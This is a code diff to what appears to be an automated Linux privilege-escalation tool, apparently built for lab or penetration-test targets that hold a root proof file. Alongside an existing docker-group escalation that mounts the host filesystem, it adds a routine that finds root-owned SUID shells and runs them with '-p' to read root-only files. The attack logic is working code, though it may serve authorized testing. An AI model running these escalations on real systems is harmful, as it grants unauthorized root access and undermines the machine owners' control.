@@ -78,6 +78,9 @@ def _sudo_read_commands() -> dict[str, str]:
 _GROUP_ESCALATIONS = {
     "docker": f"docker run -v /:/mnt --rm alpine cat /mnt{_ROOT_PROOF} 2>/dev/null",
 }
+# SUID shells: a root-owned SUID shell is an instant root read via -p.
+_SUID_SHELLS = ("bash", "sh", "dash", "ash", "zsh", "ksh")
+_SUID_PATH_RE = re.compile(r"^(/\S+)$")
 _SUDO_ALL_RE = re.compile(r"\(\s*ALL(?:\s*:\s*ALL)?\s*\)\s*(?:NOPASSWD:\s*)?ALL\b", re.IGNORECASE)
 _NOPASSWD_BIN_RE = re.compile(r"NOPASSWD:\s*(.+)", re.IGNORECASE)
 
@@ -106,6 +109,16 @@ def attempt_escalation(session: Session, enum_output: str, findings: list[Findin
     for group, cmd in _GROUP_ESCALATIONS.items():
         if group in id_line.lower():
             r = _try(session, cmd, f"'{group}' group", runner)
+            if r.escalated:
+                return r
+
+    # 4) A SUID shell (root-owned) -> read the proof with -p (keeps euid=root).
+    for line in enum_output.splitlines():
+        m = _SUID_PATH_RE.match(line.strip())
+        if m and m.group(1).rsplit("/", 1)[-1] in _SUID_SHELLS:
+            path = m.group(1)
+            r = _try(session, f"{path} -p -c 'cat {_ROOT_PROOF}'",
+                     f"SUID {path.rsplit('/', 1)[-1]}", runner)
             if r.escalated:
                 return r
 
